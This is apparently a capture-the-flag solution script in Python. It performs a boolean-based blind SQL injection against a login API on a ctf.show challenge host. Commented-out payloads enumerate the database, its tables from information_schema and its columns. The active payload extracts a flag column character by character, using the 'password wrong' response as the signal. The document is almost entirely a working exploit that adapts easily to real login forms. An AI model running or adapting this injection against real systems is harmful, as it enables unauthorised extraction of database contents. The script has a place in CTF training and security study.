# author:yu22x
import requests
import string

url = "http://6aef9743-56c2-4a39-89e5-88a001bcfb3d.challenge.ctf.show/api/index.php"
s = string.ascii_letters + string.digits
flag = ''
for i in range(1, 45):
    # print(i)
    for j in range(32, 128):
        # 跑库名
        # data = {
        #     'username': f"'||if(ascii(substr(database(),{i},1))={j},1,0)#",
        #     'password': '1'
        # }

        # 跑表名
        # data = {
        #     'username': f"'||if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))={j},1,0)#",
        #     'password': '1'
        # }

        # 跑列名
        # data = {
        #     'username': f"'||if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))={j},1,0)#",
        #     'password': '1'
        # }
        # 跑数据
        data = {
            'username': f"'||if(ord(substr((select f1ag from ctfshow_fl0g),{i},1))={j},1,0)#",
            'password': '1'
        }
        r = requests.post(url, data=data)
        if ("\\u5bc6\\u7801\\u9519\\u8bef" in r.text):
            flag += chr(j)
            print(flag)
            break
